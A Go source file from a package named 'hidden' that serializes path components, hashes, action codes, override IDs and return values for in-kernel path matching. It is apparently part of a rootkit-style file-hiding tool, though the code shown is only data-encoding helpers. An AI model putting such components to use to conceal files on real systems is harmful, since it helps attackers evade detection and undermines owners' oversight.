package hidden

import (
	"fmt"
	"strings"
)

// RkPathKey represents a path node used to match in-kernel path
type RkPathKey struct {
	Path string
	Pos  uint64
}

// Write write binary representation
func (p *RkPathKey) Write(buffer []byte) {
	hash := FNVHashStr(p.Path)
	ByteOrder.PutUint64(buffer[0:8], hash)
	ByteOrder.PutUint64(buffer[8:16], p.Pos)
}

// Bytes returns array of byte representation
func (p *RkPathKey) Bytes() []byte {
	b := make([]byte, 16)
	p.Write(b)
	return b
}

func (p *RkPathKey) String() string {
	return fmt.Sprintf("Path: %s, Pos: %d, Hash: %d", p.Path, p.Pos, FNVHashStr(p.Path))
}

// RkPathKeys returns a list of RkPathKey for the given path
func RkPathKeys(s string) []RkPathKey {
	var keys []RkPathKey

	els := strings.Split(s, "/")

	if len(els) > 0 {
		if els[0] == "" {
			els[0] = "/"
		}
		if els[len(els)-1] == "" {
			els = els[:len(els)-1]
		}
	}
	last := len(els) - 1

	for i, el := range els {
		keys = append(keys, RkPathKey{
			Path: el,
			Pos:  uint64(last - i),
		})
	}

	return keys
}

// PathAttr represents attr to apply for a path
type PathAttr struct {
	FSType      string
	Action      uint64
	OverrideID  uint64
	ReturnValue int64
	HiddenHash  uint64
}

// Write write binary representation
func (p *PathAttr) Write(buffer []byte) {
	hash := FNVHashStr(p.FSType)
	ByteOrder.PutUint64(buffer[0:8], hash)
	ByteOrder.PutUint64(buffer[8:16], p.Action)
	ByteOrder.PutUint64(buffer[16:24], uint64(p.ReturnValue))
	ByteOrder.PutUint64(buffer[24:32], p.OverrideID)
	ByteOrder.PutUint64(buffer[32:40], p.HiddenHash)
}

// Bytes returns array of byte representation
func (p *PathAttr) Bytes() []byte {
	b := make([]byte, 40)
	p.Write(b)
	return b
}

func (p *PathAttr) String() string {
	return fmt.Sprintf("FSType: %s, Hash: %d", p.FSType, FNVHashStr(p.FSType))
}
